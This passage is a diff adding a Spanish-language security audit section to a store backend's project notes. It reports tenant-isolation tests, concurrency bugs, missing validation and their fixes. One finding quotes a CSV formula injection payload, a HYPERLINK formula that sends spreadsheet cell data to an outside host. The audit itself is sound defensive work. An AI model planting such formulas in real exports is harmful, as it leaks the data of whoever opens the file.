@@ -242,9 +242,56 @@ Aislamiento entre tests por multi-tenancy (cada test hace su propio sign-up), so
 
 ### Pendientes conocidos, no cerrados
 
-- **Rate limiting detrás de proxy**: particiona por IP de conexión, que detrás de un proxy colapsa a un solo cupo compartido. Arreglarlo requiere `ForwardedHeaders`, y habilitarlo sin declarar proxies de confianza permite falsear la IP vía `X-Forwarded-For` — queda peor que ahora. Necesita la topología real → **va con el despliegue** (Fase X3).
-- **Concurrencia**: varias operaciones son check-then-act sin token de concurrencia (cuotas, stock). Mitigado en ventas por el rollback del PR #12, pero no resuelto de fondo.
+- ~~**Rate limiting detrás de proxy**~~ — **cerrado el 2026-08-11** (ver 2.ter).
+- ~~**Concurrencia**~~ — **cerrado el 2026-08-11** (ver 2.ter). Era bastante peor de lo que decía esta nota: no estaba "mitigado en ventas", estaba abierto de par en par.
 - **Código muerto**: la auditoría inventarió bastante (métodos, errores de enum, eventos sin handler). No se limpió todavía.
+
+---
+
+## 2.ter Auditoría de seguridad adversarial (2026-08-11)
+
+Segunda pasada sobre el backend ya corregido, con una sola pregunta: **si quisiera robarle datos o plata a esta bodega, ¿por dónde entro?** Se revisó archivo por archivo la superficie de ataque (autenticación, aislamiento entre negocios, roles, validación, concurrencia, configuración) y se escribieron **85 tests nuevos que atacan la API de verdad**, en vez de recorrer el camino feliz.
+
+### Lo que aguantó
+
+Vale decirlo primero, porque es la parte que costó construir y funcionó:
+
+- **Aislamiento entre negocios**: 22 tests que, con un token válido de un negocio, apuntan a los ids de otro — productos, ventas, líneas de venta, clientes, proveedores, órdenes de compra, almacenes, lotes, alertas, reportes, usuarios, perfil del negocio. **Ninguno entró.** El filtro global de `AppDbContext` que falla cerrado hace el trabajo, y ningún `Resource` de entrada acepta `BusinessId` (siempre sale del token), así que tampoco hay mass assignment de inquilino.
+- **Matriz de roles**: 12 tests de escalada (cajero invitándose un admin, cajero leyendo los KPIs del dueño, almacén vendiendo, cajero cambiando la contraseña del dueño). Todos 403.
+- **Forja de tokens**: firma con clave ajena, `alg: none`, `business_id` alterado, `token_version` viejo, usuario inexistente, token expirado. Todos 401.
+
+### Lo que se rompió, y se arregló
+
+| Severidad | Defecto | Corrección |
+|---|---|---|
+| **Crítico** | **Sobreventa por concurrencia.** 8 ventas simultáneas de **la última unidad**: las 8 se confirmaron. El chequeo de stock es una lectura y el descuento una escritura aparte, sin nada en medio | Token de concurrencia (`IVersionedEntity` + `ConcurrencyVersionInterceptor`) en `InventoryItem`. El que llega segundo recibe 409 y no se lleva stock que no existe |
+| **Crítico** | **Cancelar una venta imprimía stock.** Cancelar la misma venta 8 veces devolvía sus 4 unidades 8 veces: 10 en stock pasaban a 38. Cualquier cajero, sin permisos especiales | Mismo token en `Sale`. La cancelación cuenta una sola vez |
+| **Crítico** | **Recibir una orden de compra la duplicaba.** 8 envíos simultáneos de `RECEIVED` sobre una orden de 20 unidades metieron 160. El guard de "ya estaba recibida" también era una lectura | Mismo token en `PurchaseOrder` |
+| **Alto** | **Inyección de fórmulas en CSV.** Los nombres de producto/proveedor y las notas son texto libre que escribe cualquier empleado de almacén; el CSV lo abre **el dueño**, en Excel. Un producto llamado `=HYPERLINK("http://.../?d="&A1,"ver")` se ejecuta al abrirlo. Además, una coma en un nombre ("Arroz, costal 50kg") inventaba una columna y corría todas las cifras a su derecha | Nuevo `CsvWriter`: comilla todos los campos (RFC 4180) y antepone `'` a lo que empiece por `=`, `+`, `-`, `@` |
+| **Alto** | **Órdenes de compra sin validación alguna.** Cantidad negativa, precio negativo y descuento del 500% entraban directo al libro de compras. Las ventas se validan desde el PR #12; las compras nunca se validaron | `CreatePurchaseOrderCommandValidator`, espejo del de ventas |
+| **Alto** | **Un fallo de ingreso de stock se tragaba en silencio.** `RegisterStockIntake` devolvía `Task` y su resultado se descartaba: la orden quedaba `RECEIVED` y confirmada aunque no hubiera entrado nada al inventario. Exactamente el defecto que el PR #12 cerró del lado de ventas, sin cerrar del lado de compras | Devuelve `Task<bool>`; `MarkReceived` hace rollback si la mercadería no entró |
+| **Medio** | **Productos, clientes, proveedores y almacenes sin validación.** Nombre vacío aceptado (`IsRequired()` rechaza NULL, no `""`), precio negativo entrando al KPI de valor de inventario, y cualquier texto más largo que su columna llegaba hasta MySQL y volvía como **500 en vez de 400** | Validadores para los 8 comandos, con los largos espejando las columnas |
+| **Medio** | **Borrar al último administrador.** Nada lo impedía, ni siquiera borrarse a uno mismo. Sin reset de contraseña ni soporte, el negocio quedaba con todos sus datos dentro y nadie capaz de entrar. Irreversible | `CannotRemoveLastAdmin` (409) |
+| **Medio** | **Rate limiting detrás de proxy.** Todas las peticiones parecen venir del proxy → un solo cupo compartido: un atacante lo agota y deja fuera a toda la bodega | `ForwardedHeaders` **opt-in**, confiando solo en los proxies declarados en `ForwardedHeaders:KnownProxies`. Sin configurar se comporta como antes (habilitarlo a ciegas permite falsear la IP y queda peor que ahora) |
+| **Medio** | **El secreto JWT de desarrollo está en el repo** y pasa todos los checks de `JwtSecretGuard`. Un despliegue que olvide `ASPNETCORE_ENVIRONMENT` arranca firmando tokens reales con una clave pública — el desastre del PR #10 por otra puerta | El guard ahora también rechaza ese secreto concreto fuera de Development |
+| **Bajo** | `EnableDetailedErrors()` activo en **todos** los entornos: mete valores de fila en los mensajes de excepción, y de ahí al log | Solo en Development, junto a `EnableSensitiveDataLogging` |
+| **Bajo** | Sign-in no miraba `Status`: una cuenta desactivada recibía 200 y un token que fallaba en todas partes | Se rechaza en el sign-in, con el mismo mensaje que credenciales inválidas (para no confirmar qué correos existen) |
+| **Bajo** | `ValidAlgorithms` sin fijar; el handler global de excepciones reventaba de nuevo si la respuesta ya había empezado, y logueaba como error cada cliente que colgaba | Algoritmo fijado a HS256; `HasStarted` respetado; las cancelaciones del cliente ya no ensucian el log |
+
+### Estado de la red de seguridad
+
+`dotnet test` corre ahora **109 tests** (24 previos + 85 nuevos), todos en verde. Los 21 que cubren los defectos de arriba se verificaron **en rojo contra el código previo** antes de arreglar nada — las cifras de la tabla (8 ventas confirmadas, 160 unidades, 38 en stock) son salidas reales de esos tests fallando.
+
+`dotnet list package --vulnerable --include-transitive`: sin paquetes vulnerables.
+
+La migración `AddOptimisticConcurrencyVersions` agrega la columna `version` a `inventory_items`, `sales`, `purchase_orders` y `payment_plans`.
+
+### Pendientes tras esta pasada
+
+- **El precio de venta lo manda el cliente.** `UnitPrice` viene en el body y no se contrasta contra `Product.BasePrice`, así que un cajero puede registrar una venta a precio 0. Para una bodega donde se regatea es defendible, pero conviene que sea una decisión tomada a propósito y no heredada.
+- **`AllowedHosts: "*"`**: sin validación de cabecera `Host`. Fijarlo al dominio real **en el despliegue** (Fase X3), junto con CORS, que hoy sale vacío a propósito y hay que configurar sí o sí.
+- **Base de datos con usuario `root`** en las cadenas de conexión. En producción toca una cuenta con permisos mínimos → va con el despliegue.
+- **`User.RevokeAllSessions()` sigue sin endpoint**: no hay "cerrar sesión en todos los dispositivos" ni forma de suspender a alguien sin borrarlo, y el borrado es físico (pierde el rastro de auditoría).
 
 ---
 
